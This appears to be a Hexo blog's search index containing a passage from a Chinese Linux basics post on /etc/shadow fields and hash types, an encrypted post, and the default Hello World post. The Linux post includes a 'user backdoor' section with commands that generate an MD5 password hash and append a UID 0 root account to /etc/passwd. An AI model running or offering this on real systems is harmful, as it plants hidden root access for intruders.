class="hljs-section">登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志</span><br></code></pre></td></tr></table></figure><ol><li>如果为空，则对应用户没有口令，登录时不需要口令；</li><li>星号代表帐号被锁定；</li><li>双叹号表示这个密码已经过期了；</li><li><code>$6$</code>开头的，表明是用SHA-512加密；</li><li><code>$1$</code>表明是用MD5加密；</li><li><code>$2$</code> 是用Blowfish加密；</li><li><code>$5$</code> 是用 SHA-256加密；</li></ol><h2 id="三、添加用户后门"><a href="#三、添加用户后门" class="headerlink" title="三、添加用户后门"></a>三、添加用户后门</h2><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/7.png" alt="image-20230801143855256"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">生成密码： openssl passwd -1 -salt admin 123456 <br>-1 的意思是使用md5crypt加密算法 <br>-salt 指定盐为admin <br>123456 明文密码<br></code></pre></td></tr></table></figure><p>追加命令（UID&#x3D;0）：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">echo</span> <span class="hljs-string">&#x27;admin:<span class="hljs-variable">$1</span><span class="hljs-variable">$admin</span><span class="hljs-variable">$LClYcRe</span>.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="/2023/08/01/Linux%E5%9F%BA%E7%A1%80/8.png" alt="image-20230801144122907"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Azzm</title>
    <link href="/2023/07/31/azzm/"/>
    <url>/2023/07/31/azzm/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6eac5b14c481274bfa4442d16d1e91cad3b64b421da391e2ba2a112ad45346c6">08ac244ee27af9f4b938f105774e559501686e3142b6eca099d306265b514d9038852d7906780708240a9e41e35e3b0d0d8ddc61e6d2cb492285e7cc4ced6221c6215cb96530d2ccfa776b9a297bd31d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码查看</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>❤</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Azzm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/07/29/hello-world/"/>
    <url>/2023/07/29/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color:red;background:背景颜色;font-size:文字大小;font-family:字体;&quot;</span>&gt;</span>define(常量名称,常量值)<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
